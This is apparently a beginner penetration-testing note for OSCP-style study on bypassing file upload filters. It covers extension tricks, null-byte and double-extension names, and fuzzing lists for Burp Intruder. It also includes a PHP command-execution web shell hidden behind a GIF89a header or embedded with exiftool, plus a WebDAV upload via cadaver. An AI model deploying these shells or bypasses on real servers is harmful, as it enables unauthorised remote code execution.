---
title: "File Upload"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - https
  - http
  - web
  - file upload
toc: true
hide_title: true
excerpt: ""
---

## Bypass file upload filtering

- Rename it
	- upload it as shell.php.jpg
- Blacklisting bypass, change extension
    - `php phtml, .php, .php3, .php4, .php5, and .inc`
	- bypassed by uploading an unpopular php extensions. such as: `pht, phpt, phtml, php3, php4, php5, php6`
    - asp `asp, .aspx`
    - perl `.pl, .pm, .cgi, .lib`
    - jsp `.jsp, .jspx, .jsw, .jsv, and .jspf`
    - Coldfusion `.cfm, .cfml, .cfc, .dbm`
- Whitelisting bypass
    - Bypassed by uploading a file with some type of tricks,
    - Like adding a null byte injection like (`shell.php%00.gif` ).
        Or by using double extensions for the uploaded file like ( `shell.jpg.php`)
- GIF89a;
    - If they check the content. Basically you just add the text "GIF89a;" before you shell-code.
```
GIF89a;            
<?            
system($_GET['cmd']);//or you can insert your complete shell code            
?>
```

### ExifTool

```
1. <?php system($_GET['cmd']); ?>  //shell.php

2. exiftool "-comment<=shell.php" malicious.png

3. strings malicious.png | grep system
```

## Bruteforcing extensions

- We can fuzz the extensions to find out which extensions are not blocked,
- we will use burpsuite for this

Some useful extensions -
- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

Now make list of extensions and add it to **intruder** to FUZZ and check out which one is worked.

Note: Make sure **url-encodin**g is unchecked in payload section, as it will unless encode our dot and we will not get desire results.

## WebDAV

We can use `cadaver` to upload the shell

```
cadaver http://192.168.1.103/dav/
put /tmp/shell.php
```
